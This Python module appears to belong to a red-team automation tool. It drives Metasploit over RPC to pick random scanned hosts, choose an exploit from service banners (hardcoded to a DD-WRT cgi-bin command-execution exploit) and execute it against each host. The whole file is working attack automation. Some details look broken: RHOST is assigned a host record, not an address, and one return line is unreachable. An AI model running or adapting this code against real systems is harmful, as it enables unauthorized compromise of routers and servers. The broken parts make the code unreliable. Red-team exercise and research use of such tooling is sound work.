import random
from typing import List

from metasploit.msfrpc import MsfRpcClient

from redbot.core.async import celery
from redbot.core.utils import random_targets
from redbot.modules import Attack
from redbot.modules.discovery import get_hosts


class MSF(Attack):
    name = 'metasploit'
    settings = {
        'enable_msf': {
            'name': 'Enable Metasploit',
            'default': False,
            'description': "Whether to enable the Metasploit functions. Metasploit must be installed and msfrpcd must "
                           "be running. Requires nmap scans with -sV."
        },
        'password': {
            'name': 'msfrpcd Password',
            'default': '',
            'description': 'Password to connect to the msfrpcd daemon.'
        },
        'payload': {
            'name': 'Payload Options',
            'default': '',
            'description': '(Optional)'
        }
    }

    @classmethod
    def run_attack(cls):
        cls.log("Starting MSF attack.")
        targets = random_targets()
        g = cls.attack_all(attacks=(msf_attack,), targets=targets)
        return g, targets


cls = MSF


def _slow_msf_search(client: MsfRpcClient, query: str):
    exploits = client.modules.exploits
    results = []
    for e in exploits:
        exploit = client.modules.use('exploit', e)
        if query.lower() in exploit.name.decode().lower() + exploit.description.decode().lower():
            results.append(e)
    return results


def msf_search(client: MsfRpcClient, query: str) -> List[str]:
    # TODO unhack
    return ['linux/http/ddwrt_cgibin_exec']
    return _slow_msf_search(client, query)


@celery.task
def msf_attack(host: str):
    client = MsfRpcClient(MSF.get_setting('password'))
    host = get_hosts()[host]
    query = ""
    port = None
    for p in random.sample(host['ports'], len(host['ports'])):
        if p.get('banner'):
            query = p['banner'].split()[1]
            port = p['port']
            break
    exploit = client.modules.use('exploit', random.choice(msf_search(client, query)))
    exploit['RHOST'.encode()] = host
    exploit['RPORT'.encode()] = port
    # TODO: Payloads?
    print(exploit.execute())
    client.jobs.list()
